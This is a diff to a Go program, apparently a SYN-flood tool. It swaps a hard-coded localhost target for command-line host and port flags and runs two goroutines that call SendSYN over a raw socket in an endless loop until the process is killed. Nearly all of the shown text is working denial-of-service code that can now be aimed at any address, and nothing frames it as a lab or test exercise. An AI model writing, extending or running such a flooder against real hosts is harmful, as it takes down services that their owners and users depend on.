@@ -1,10 +1,15 @@
 package main
 
 import (
+	"context"
+	"flag"
 	"fmt"
 	"log"
 	"math/rand"
 	"net"
+	"os"
+	"os/signal"
+	"sync"
 	"syscall"
 	"time"
 )
@@ -15,25 +20,48 @@ func init() {
 
 func main() {
 
-	// TODO make dst ip and port as args/flags
-	dstIp := net.ParseIP("127.0.0.1")
-	dstPort := 8080
+	host := flag.String("host", "", "destination ip")
+	port := flag.Int("port", 0, "destination port")
+	flag.Parse()
+
+	dstIp := net.ParseIP(*host)
+	dstPort := uint16(*port)
 
 	rawSocket, err := NewRawSocket(dstIp)
 	if err != nil {
 		log.Fatalf("new raw socket: %v", err)
 	}
 
+	wg := &sync.WaitGroup{}
+	ctx, cancelFunc := context.WithCancel(context.Background())
 	for i := 0; i < 2; i++ {
-		go func() {
-			for {
-				if err := SendSYN(rawSocket, dstIp, uint16(dstPort)); err != nil {
-					log.Printf("send SYN: %v", err)
-				}
-			}
-		}()
+		wg.Add(1)
+		go Run(wg, ctx, rawSocket, dstIp, dstPort)
 	}
-	time.Sleep(5 * time.Second) // TODO ---
+
+	termChan := make(chan os.Signal, 1)
+	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
+	<-termChan
+	log.Println("received term signal")
+	cancelFunc()
+	wg.Wait()
+	log.Println("done")
+}
+
+func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket RawSocket, dstIp net.IP, dstPort uint16) {
+
+	for {
+		select {
+		case <-ctx.Done():
+			log.Println("canceling")
+			wg.Done()
+			return
+		default:
+			if err := SendSYN(rawSocket, dstIp, dstPort); err != nil {
+				log.Printf("send SYN: %v", err)
+			}
+		}
+	}
 }
 
 func SendSYN(rawSocket RawSocket, dstIp net.IP, dstPort uint16) error {
